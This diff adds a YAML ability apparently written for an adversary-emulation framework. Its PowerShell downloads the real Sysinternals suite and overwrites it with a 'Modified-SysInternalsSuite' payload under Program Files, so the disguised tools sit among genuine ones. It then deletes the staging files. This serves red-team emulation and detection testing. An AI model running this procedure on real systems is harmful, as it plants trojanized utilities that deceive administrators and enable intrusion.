@@ -1,0 +1,66 @@
+---
+- id: 4f7d21c9-ea31-4943-ad8a-efbbeeccdd7d
+  name: 4.A - Planting Modified Sysinternals Utilities
+  description: Uploading payloads masquerading as via modified SysInternalsSuite
+  tactic: stage-capabilities
+  technique:
+    attack_id: T1362
+    name: Upload, install, and configure software/tools
+  platforms:
+    windows:
+      psh,pwsh:
+        timeout: 300
+        command: |
+
+          iwr -uri "https://download.sysinternals.com/files/SysinternalsSuite.zip" -outfile SysInternalsSuite.zip;
+          Expand-Archive -Path SysInternalsSuite.zip -DestinationPath "C:\Users\#{profile_user}\Downloads\SysInternalsSuite" -Force;
+
+          if (! $?) {
+            write-host "Error moving files to #{profile_user}\Downloads";
+            exit 1;
+          }
+
+          Move-Item Modified-SysInternalsSuite.zip "C:\Users\#{profile_user}\Downloads" -Force;
+          Expand-Archive -LiteralPath "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip" -DestinationPath "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite" -Force;
+
+          if (! $?) {
+            write-host "Error expanding files to #{profile_user}\Downloads";
+            exit 1;
+          }
+
+          $dir_exists=Test-Path -path "C:\Program Files\SysInternalsSuite";
+          if ($dir_exists -eq $true) {
+            write-host "[*] SysInternalsSuite folder exists within \"C:\Program Files\", copying over payloads then removing folder from Downloads.";
+            Move-Item -path "C:\Users\#{profile_user}\Downloads\SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
+            Move-Item -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
+          } else {
+            mkdir "C:\Program Files\SysInternalsSuite";
+            Copy-Item -Path "C:\Users\#{profile_user}\Downloads\SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
+            Copy-Item -Path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
+          }
+
+          if (test-path -path "SysInternalsSuite.zip") {
+            Remove-Item -path "filesystem::SysInternalsSuite.zip" -force;
+          }
+
+          if (test-path -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip" ) {
+            remove-item -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip" -force;
+          }
+
+          if (test-path -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite") {
+            remove-item -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite" -recurse -force;
+          }
+
+          if (test-path -path "C:\Users\#{profile_user}\Downloads\SysInternalsSuite") {
+            Remove-Item -path  "C:\Users\#{profile_user}\Downloads\SysInternalsSuite" -recurse -force;
+          }
+
+          Set-Location -path "C:\Program Files\SysInternalsSuite";
+          if ($?) {
+            gci;
+            write-host "[*] Successfully planted files"
+          } else {
+            write-host "[!] Error downloading and planting modified system tools."
+          }
+
+        payload: Modified-SysInternalsSuite.zip
